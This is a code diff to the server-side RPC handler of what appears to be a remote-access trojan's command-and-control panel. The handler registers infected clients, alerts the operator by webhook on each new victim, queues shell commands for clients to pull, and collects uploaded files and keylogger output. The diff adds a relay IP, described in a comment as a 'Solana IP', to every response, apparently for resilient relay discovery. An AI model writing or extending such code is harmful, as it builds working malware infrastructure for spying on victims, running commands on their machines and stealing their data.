@@ -5,6 +5,7 @@ import path from 'node:path';
 import crypto from 'node:crypto';
 import { db, UPLOAD_DIR } from './local_db.js';
 import { getCachedUser, clearCache } from './cache.js';
+import { getRemoteIp } from './discovery.js'; // <--- ADD THIS
 
 const MAX_UPLOAD = Number(process.env.MAX_UPLOAD_BYTES || 64 * 1024 * 1024);
 const MAX_RESULT = 32 * 1024 * 1024;
@@ -51,7 +52,7 @@ export async function handleRpc(msg, remoteIp) {
       if (existingRows.length > 0) {
         const existing = existingRows[0];
         await db.query(`UPDATE clients SET ip = ?, last_seen = ? WHERE id = ?`, [ip, Date.now(), existing.id]);
-        return { ok: true, clientId: Number(existing.id) };
+        return { ok: true, clientId: Number(existing.id), relay_ip: getRemoteIp() };
       }
 
       const [info] = await db.query(`
@@ -61,7 +62,7 @@ export async function handleRpc(msg, remoteIp) {
 
       sendHitWebhook(uid, hostname, ip).catch(() => {});
 
-      return { ok: true, clientId: Number(info.insertId) };
+      return { ok: true, clientId: Number(info.insertId), relay_ip: getRemoteIp() };
     }
 
     case 'pull': {
@@ -80,7 +81,7 @@ export async function handleRpc(msg, remoteIp) {
         client = rows[0];
       }
 
-      if (!client) return { id: null, clientId: null };
+      if (!client) return { id: null, clientId: null, relay_ip: getRemoteIp() };
 
       await db.query(`UPDATE clients SET last_seen = ?, ip = ? WHERE id = ?`, [Date.now(), ip, client.id]);
 
@@ -90,7 +91,7 @@ export async function handleRpc(msg, remoteIp) {
         ORDER BY created_at ASC LIMIT 1
       `, [uid, client.id]);
 
-      if (cmdRows.length === 0) return { id: null, clientId: Number(client.id) };
+      if (cmdRows.length === 0) return { id: null, clientId: Number(client.id), relay_ip: getRemoteIp() };
       const c = cmdRows[0];
 
       await db.query(`UPDATE commands SET status = 'sent' WHERE id = ?`, [c.id]);
@@ -99,6 +100,7 @@ export async function handleRpc(msg, remoteIp) {
         shell: c.shell,
         line: c.line,
         clientId: Number(client.id),
+        relay_ip: getRemoteIp() // <--- Sends the Solana IP to the client
       };
     }
 
@@ -114,6 +116,7 @@ export async function handleRpc(msg, remoteIp) {
     }
 
     case 'upload': {
+      // ... keep as is ...
       const clientId = Number(msg.clientId || 0);
       const name = String(msg.name || 'upload.zip').slice(0, 128).replace(/[^\w.\-]/g, '_');
       if (typeof msg.data !== 'string' || !msg.data) return { error: 'no data' };
@@ -156,6 +159,7 @@ export async function handleRpc(msg, remoteIp) {
     }
 
     case 'keylog': {
+      // ... keep as is ...
       const clientId = Number(msg.clientId || 0);
       const data = String(msg.data || '').slice(0, 65536);
       if (!data) return { error: 'empty' };
